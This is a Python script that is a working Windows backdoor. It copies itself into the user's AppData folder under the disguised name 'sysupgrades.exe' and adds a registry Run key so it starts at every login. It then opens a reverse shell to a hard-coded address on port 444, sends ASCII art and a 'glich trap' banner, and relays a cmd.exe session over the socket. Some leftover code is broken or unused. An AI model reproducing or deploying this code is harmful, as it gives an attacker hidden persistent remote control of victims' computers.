import time
import subprocess
import os
import shutil
import sys
import os,socket,subprocess,threading;
def speak_windows():
    cmd = [
        "powershell",
        "-Command",
        f"(New-Object -ComObject SAPI.SpVoice).Speak('{text}')"]
    
    
    subprocess.run(cmd, check=False)
ascii_art = r"""
⠰⢷⣾⡾⣷⣿⡾⣷⢿⡾⣷⠿⡾⠟⠾⢳⠞⣖⢲⠒⠒⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠠⠀⡀⠀⢀⢠⠒⣔⠲⣖⡞⣶⢳⣞⣶⢿⡶⣿⣾⢷⣾⣶⣷⡖⡤⠀⢠⢂⠲⡐
⠀⠂⠤⡑⠬⣐⠱⢌⠢⡜⢤⠓⠤⣉⠰⣀⠚⠌⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠐⠠⠁⢈⠂⡙⠴⣫⠷⣽⢯⣟⣾⣽⣿⣿⣿⣿⣿⣿⣿⣿⡽⣲⠁⢄⢊⠥⣣
⠀⢌⠰⡁⠞⡌⠳⣌⠱⡘⢆⡩⠒⢤⠃⡬⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠀⠆⡈⠙⢯⣿⢾⡿⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣵⡂⢠⣨⣿⣿
⠀⢎⠲⣉⠖⣌⡑⢢⠱⣉⢆⡒⢍⢢⠘⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⣿⣿⣿⣿⣿
⠀⢌⡱⢌⡞⣴⣫⢗⡻⣜⢮⡽⣘⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⢿⣿⣿⣿⣿⣿⣿⣿⡘⣌⢺⣿⣿⣿⣿
⠀⠎⡰⢏⡸⢆⡹⡎⢷⡉⡾⢱⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⣿⣿⣿⣿⣿⢷⡈⠾⣿⣿⣿⣿
⠀⠌⡑⢢⡑⣎⢷⣹⢣⣝⡱⣏⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⠡⡌⠄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⣿⣿⣿⡋⢆⡉⠜⢻⣿⣿⣿
⣰⣯⣿⣷⣿⣿⣿⣿⣿⣿⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠴⡻⣦⠀⠀⣚⢤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⡱⢮⡒⠈⠘⣿⣿⣿
⠾⢿⡿⣿⠿⣿⠿⡿⢿⠿⡿⢿⠿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠶⠋⠈⢰⢈⠢⡲⠓⢿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⢏⡜⣡⢍⠳⠆⣿⣿⣿
⠀⢀⡐⢄⠣⣄⢳⣈⢦⢣⡵⢊⡔⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡤⠊⠀⠀⠀⢸⡈⠸⠁⠀⠰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⡞⣼⣚⡷⢨⢹⣧⣿⣿⣿
⠀⠠⢘⣮⣷⣿⣶⣿⣮⣥⣌⣥⣴⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡠⠒⠉⠀⠀⠀⠀⠠⢚⠀⠅⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⢼⢣⢎⡱⢁⠾⣽⣿⣿⣿
⠀⠠⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡤⢂⡐⠀⠀⠀⠀⠠⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣷⢮⡗⠦⠐⢈⠐⣨⣿⣿⣿
⠀⢡⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⡆⠀⠀⠀⠀⠀⣀⠾⣡⢞⣽⣷⡀⠀⠀⠀⠀⠱⡀⠀⠀⠀⠀⠀⠀⡼⣩⣿⣿⢎⠱⠀⠂⡈⢰⣿⣿⣿
⠀⢂⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢫⢿⢷⣶⡶⠟⠏⠁⣸⡾⣿⡿⠿⢷⣀⡀⠀⠀⣀⡇⠀⠀⠀⠀⠀⠐⣿⣿⣿⢿⣊⡄⢣⡳⢄⣿⣿⣿⣿
⠀⠄⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠁⠀⢀⠆⡾⠥⠛⠁⠀⠀⠀⠀⢻⡿⢟⠋⠀⠀⠀⠀⠀⠀⠀⣿⣿⣽⣿⣿⣿⣷⡭⣒⢾⣿⣿⣿
⠀⠘⣼⣿⣿⣿⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡄⠠⢜⣢⣾⣝⢔⢶⣖⣦⣶⢬⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣥⣿⣿⣿⣿
⠀⠰⢸⣿⣿⣿⣿⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢀⠇⡸⢿⡿⢏⣾⡿⣿⠿⢿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⠀⠀⠌⡙⢟⠻⡛⠿⠿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠪⢁⡴⢕⣿⣽⠏⠁⠀⠀⠀⠀⢱⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠰⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀
⠀⠀⢀⠰⢌⠢⢱⡘⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⡉⢜⣿⣏⠆⠀⠀⠀⠀⠀⠀⡨⠀⠀⠀⠀⠀⠀⣀⡄⠚⠰⠀⠀⠀⠈⢻⣿⣿⣿⣿⣿⣿⣿
⠀⠀⠄⣺⣼⣳⣶⣽⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠀⢿⡏⠀⠀⠀⠀⠀⠀⢠⠃⠀⠀⠀⠀⢀⠰⠛⠃⠀⠀⢀⠀⠀⠀⣹⣿⣿⣿⣿⣿⣿⠀⠀
⠀⠀⠐⢠⣋⣷⣻⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣁⢺⡇⠀⠀⠀⠀⠀⢀⡏⠀⠀⣠⠐⠊⠁⢀⡲⠆⠀⠀⠀⢀⠐⢼⣿⣿⣿⠜⣿⣿⣿⣿⣿⡇⠀
⠀⠀⠈⠲⠿⠿⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⢽⡇⠀⠀⠀⠀⠀⡸⠠⠐⠉⠀⣀⡀⠀⢈⡟⠱⢂⠀⠀⣌⣦⣅⣛⠻⣿⣞⣿⣿⣿⣿⣿⡗⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢘⣧⠀⢀⣠⠔⠊⠁⣀⡀⠀⠀⠈⠉⠷⠻⠄⠁⠀⠀⠀⣿⡏⣿⡇⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠼⠐⠉
"""

def add_to_registry():
	#persistence
	new_file = os.environ["appdata"] + "\\sysupgrades.exe"
	if not os.path.exists(new_file):
		shutil.copyfile(sys.executable,new_file)
		regedit_command = "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v upgrade /t REG_SZ /d " + new_file
		subprocess.call(regedit_command, shell=True)
add_to_registry()
#my_check = subprocess.check_output("commmand",shell=True,stderr=subprocess.DEVNULL,stdin=subprocess.DEVNULL)
startup = os.path.join(os.getenv("APPDATA"), "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
script_path = sys.argv[0]
dest_path = os.path.join(startup, "sysupgrades.exe") 

def s2p(s, p):
    while True:
        data = s.recv(1024)
        if len(data) > 0:
            p.stdin.write(data)
            p.stdin.flush()
def p2s(s, p):
    while True:
        s.send(p.stdout.read(1))
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.0.32",444))
s.send(ascii_art.encode())
s.send(b"\033[35m[+]glich trap\033[0m\n")
p=subprocess.Popen(["cmd"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
s2p_thread = threading.Thread(target=s2p, args=[s, p])
s2p_thread.daemon = True
s2p_thread.start()

p2s_thread = threading.Thread(target=p2s, args=[s, p])
p2s_thread.daemon = True
p2s_thread.start()

try:
    p.wait()
except KeyboardInterrupt:
    s.close()
